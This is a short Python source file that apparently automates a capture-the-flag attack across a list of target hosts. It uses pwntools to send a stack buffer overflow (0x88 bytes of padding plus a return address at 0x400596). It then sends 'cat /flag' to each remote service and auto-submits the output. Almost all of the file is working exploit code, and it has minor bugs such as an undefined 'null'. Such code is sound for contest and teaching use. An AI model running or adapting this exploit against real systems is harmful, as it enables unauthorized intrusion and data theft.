from pwn import *
from lib.submit_flag import submit_flag
from core.data import *


def pwn_run():
    flag = null
    for i in range(0, len(conf.targets)):
        try:
            flag = pwn_exp(conf.targets[i], conf.ports[i])
        except Exception as f:
            print("exp出错！@".format(conf.targets[i]))
        if flag:
            submit_flag(flag)


def pwn_exp(target, port: int):  # 修改此处exp返回flag
    context.log_level = 'debug'
    p = remote(target, port)
    sh_addr = 0x400596
    exp = b"cat /flag"
    p.sendlineafter("Hello, World", b"a" * 0x88 + p64(sh_addr))
    p.sendline(exp)
    res = p.recvall(timeout=1)
    res = res.decode("utf-8")
    res = res.strip()
    return res


